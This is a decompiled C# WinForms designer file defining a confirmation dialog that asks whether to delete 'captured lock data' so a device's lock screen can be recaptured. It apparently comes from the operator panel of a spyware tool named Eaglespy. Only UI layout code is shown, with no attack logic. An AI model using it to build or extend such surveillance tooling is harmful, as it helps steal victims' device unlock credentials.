namespace Eaglespy
{
	// Token: 0x020000F2 RID: 242
	public partial class Msgbox : global::System.Windows.Forms.Form
	{
		// Token: 0x06000C55 RID: 3157 RVA: 0x00007833 File Offset: 0x00005A33
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000C56 RID: 3158 RVA: 0x001143AC File Offset: 0x001125AC
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.drakeUIButtonIcon2 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.drakeUIButtonIcon1 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.HeaderText = new global::System.Windows.Forms.Label();
			this.DescText = new global::DrakeUI.Framework.DrakeUIRichTextBox();
			base.SuspendLayout();
			this.guna2BorderlessForm1.BorderRadius = 15;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			this.guna2BorderlessForm1.ResizeForm = false;
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.Blue;
			this.guna2BorderlessForm1.TransparentWhileDrag = true;
			this.drakeUIButtonIcon2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.drakeUIButtonIcon2.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon2.FillDisableColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon2.FillHoverColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon2.FillPressColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon2.FillSelectedColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.drakeUIButtonIcon2.ForeColor = global::System.Drawing.Color.Lime;
			this.drakeUIButtonIcon2.Location = new global::System.Drawing.Point(249, 130);
			this.drakeUIButtonIcon2.Name = "drakeUIButtonIcon2";
			this.drakeUIButtonIcon2.RectColor = global::System.Drawing.Color.Lime;
			this.drakeUIButtonIcon2.RectDisableColor = global::System.Drawing.Color.Green;
			this.drakeUIButtonIcon2.RectHoverColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon2.RectPressColor = global::System.Drawing.Color.Green;
			this.drakeUIButtonIcon2.RectSelectedColor = global::System.Drawing.Color.Lime;
			this.drakeUIButtonIcon2.Size = new global::System.Drawing.Size(31, 25);
			this.drakeUIButtonIcon2.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.drakeUIButtonIcon2.SymbolSize = 20;
			this.drakeUIButtonIcon2.TabIndex = 7;
			this.drakeUIButtonIcon2.Click += new global::System.EventHandler(this.drakeUIButtonIcon2_Click);
			this.drakeUIButtonIcon1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.drakeUIButtonIcon1.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon1.FillDisableColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon1.FillHoverColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon1.FillPressColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon1.FillSelectedColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.drakeUIButtonIcon1.ForeColor = global::System.Drawing.Color.Red;
			this.drakeUIButtonIcon1.Location = new global::System.Drawing.Point(97, 130);
			this.drakeUIButtonIcon1.Name = "drakeUIButtonIcon1";
			this.drakeUIButtonIcon1.RectColor = global::System.Drawing.Color.Red;
			this.drakeUIButtonIcon1.RectDisableColor = global::System.Drawing.Color.Red;
			this.drakeUIButtonIcon1.RectHoverColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon1.RectPressColor = global::System.Drawing.Color.Maroon;
			this.drakeUIButtonIcon1.RectSelectedColor = global::System.Drawing.Color.FromArgb(192, 0, 0);
			this.drakeUIButtonIcon1.Size = new global::System.Drawing.Size(33, 25);
			this.drakeUIButtonIcon1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.drakeUIButtonIcon1.Symbol = 61453;
			this.drakeUIButtonIcon1.SymbolSize = 20;
			this.drakeUIButtonIcon1.TabIndex = 6;
			this.drakeUIButtonIcon1.Click += new global::System.EventHandler(this.drakeUIButtonIcon1_Click);
			this.HeaderText.AutoSize = true;
			this.HeaderText.Font = new global::System.Drawing.Font("Arial Rounded MT Bold", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.HeaderText.ForeColor = global::System.Drawing.Color.White;
			this.HeaderText.Location = new global::System.Drawing.Point(82, 9);
			this.HeaderText.Name = "HeaderText";
			this.HeaderText.Size = new global::System.Drawing.Size(210, 17);
			this.HeaderText.TabIndex = 8;
			this.HeaderText.Text = "Captured lock data Remove";
			this.HeaderText.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.DescText.AutoWordSelection = true;
			this.DescText.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.DescText.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.DescText.ForeColor = global::System.Drawing.Color.White;
			this.DescText.Location = new global::System.Drawing.Point(26, 52);
			this.DescText.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
			this.DescText.Name = "DescText";
			this.DescText.Padding = new global::System.Windows.Forms.Padding(2);
			this.DescText.ReadOnly = true;
			this.DescText.RectColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.DescText.Size = new global::System.Drawing.Size(323, 60);
			this.DescText.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DescText.TabIndex = 9;
			this.DescText.Text = "By allowing you delete current captured lock screen  can recapture the lock screen if it did not captured correctly, Are you sure?";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			base.ClientSize = new global::System.Drawing.Size(386, 167);
			base.Controls.Add(this.DescText);
			base.Controls.Add(this.HeaderText);
			base.Controls.Add(this.drakeUIButtonIcon2);
			base.Controls.Add(this.drakeUIButtonIcon1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Name = "Msgbox";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Msgbox";
			base.Load += new global::System.EventHandler(this.Msgbox_Load);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000FA5 RID: 4005
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000FA6 RID: 4006
		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;

		// Token: 0x04000FA7 RID: 4007
		private global::System.Windows.Forms.Label HeaderText;

		// Token: 0x04000FA8 RID: 4008
		private global::DrakeUI.Framework.DrakeUIButtonIcon drakeUIButtonIcon2;

		// Token: 0x04000FA9 RID: 4009
		private global::DrakeUI.Framework.DrakeUIButtonIcon drakeUIButtonIcon1;

		// Token: 0x04000FAA RID: 4010
		private global::DrakeUI.Framework.DrakeUIRichTextBox DescText;
	}
}
